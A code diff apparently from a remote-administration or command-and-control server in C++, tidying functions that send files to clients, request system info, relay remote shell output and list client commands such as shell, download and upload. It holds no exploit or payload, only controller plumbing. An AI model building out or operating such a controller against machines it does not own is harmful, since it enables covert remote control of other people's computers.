@@ -117,12 +117,10 @@ bool Server::SendFile(const std::string strRemoteFile, const std::string strLoca
 					std::fflush(stdout);
 				} else {
 					std::cout<<"Unable to send file bytes\n";
-					//Misc::Free(cFileBuffer, iBlockSize);
 					error();
-					break; //no bytes readed end?
+					break;
 				}
 			} else {
-				//Misc::Free(cFileBuffer, iBlockSize);
 				break;
 			}
 		}
@@ -306,24 +304,6 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 					}
 					delete[] cBufferInfo;
 					cBufferInfo = nullptr;
-				} else if(vcClientCommands[1] == "-f"){
-					//full information
-					char cBufferFullInfo[2048];
-					int iBytes = 0;
-					if(SSL_write(Clients[iClientID]->sslSocket, CommandCodes::cReqFullInfo, 3) > 0){
-						if((iBytes = SSL_read(Clients[iClientID]->sslSocket, cBufferFullInfo, 2047)) > 0){
-							cBufferFullInfo[iBytes] = '\0';
-							//here parse full info depending wich os
-							//Clients[iClientID]->strOS == "Linux" ? parsefullinfolinux : parsefullinfowindows
-							//not implemented yet
-						} else {
-							std::cout<<"Unable to retrieve information from client\n";
-							error();
-						}
-					} else {
-						std::cout<<"Unable to send command to client\n";
-						error();
-					}
 				}
 			} else {
 				std::cout<<"\n\tUse info -b (Basic)\n";
@@ -856,9 +836,9 @@ void Server::threadMasterCMD(){
 			close(sckMainSocket);
 			break;
 		}
-		//if(iClientsOnline == 0){
-		//	continue;
-		//}
+		if(iClientsOnline == 0){
+			continue;
+		}
 		//interact with clients
 		if(vcCommands[0] == "cli"){
 			if(vcCommands.size() == 5){ //cli -c id -a action
@@ -961,7 +941,7 @@ void Server::threadClientPing(){
 						notify_notification_show(Not, nullptr);
 						g_object_unref(G_OBJECT(Not));
 						#else
-						std::cout<<"Client["<<Clients[iClientID]->iID<<"] "<<Clients[iClientID]->strIP<<" disconnected\n";
+						std::cout<<"\nClient["<<Clients[iClientID]->iID<<"] "<<Clients[iClientID]->strIP<<" disconnected\n";
 						#endif
 						mtxLock();
 						Clients[iClientID]->isConnected = false;
@@ -978,9 +958,6 @@ void Server::threadClientPing(){
 }
 
 void Server::threadRemoteCmdOutput(int iClientID){
-	std::string strCmdBuffer = "";
-	std::string strTmp = "";
-	std::string strPassword = "password";
 	char cCmdBuffer[1024];
 	int iBytes = 0;
 	while(isReadingShell){
@@ -1028,8 +1005,6 @@ void Server::Help(const std::string strHelp, int iOS){
 		return;
 	}
 	if(strHelp == "client"){
-		//shell info download upload httpd
-		//1 linux 0 windows
 		std::cout<<"Available commands\n";
 		vHeaders.push_back("Command");
 		vHeaders.push_back("About");
